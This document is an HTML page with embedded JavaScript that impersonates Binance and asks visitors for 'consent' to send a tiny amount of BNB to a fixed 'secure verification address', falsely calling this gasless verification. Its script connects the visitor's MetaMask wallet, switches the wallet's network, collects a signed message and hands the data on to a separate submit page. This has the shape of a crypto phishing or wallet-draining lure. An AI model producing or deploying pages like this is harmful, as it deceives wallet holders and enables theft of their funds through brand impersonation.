<!-- index.html -->
<!DOCTYPE html>
<html>
<head>
  <title>Gasless BNB Transaction Consent</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
</head>
<body>
  <h3>ðŸ›¡ Binance Consent Required</h3>
  <p>
    Binance requires your consent to send <b>0.0000000001 BNB</b> to our secure verification address
    <br><code>0x0d4eFb6dfF647912Bb7B29Ed3a0e1E8f6E4c297a</code>
    <br>This transaction will not cost any gas fee for you.
  </p>
  <button onclick="connectAndSign()">Give Consent</button>

  <script>
    const receiver = "0x0d4eFb6dfF647912Bb7B29Ed3a0e1E8f6E4c297a";

    async function connectAndSign() {
      if (!window.ethereum) return alert("Please install MetaMask first.");

      const web3 = new Web3(window.ethereum);

      // 1. Connect wallet
      const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
      const sender = accounts[0];

      // 2. Switch to BNB Smart Chain
      try {
        await ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x38' }]
        });
      } catch (err) {
        return alert("Please switch to BNB Smart Chain manually.");
      }

      // 3. Define the amount
      const amountBNB = "0.0000000001";
      const message = `I approve sending ${amountBNB} BNB to ${receiver} for verification purposes.`;

      // 4. Sign the consent message
      const signature = await web3.eth.personal.sign(message, sender);

      // 5. Store for submit.html
      const txData = {
        from: sender,
        to: receiver,
        value: amountBNB,
        message,
        signature
      };

      localStorage.setItem("tx_data", JSON.stringify(txData));
      window.location.href = "submit.html";
    }
  </script>
</body>
</html>
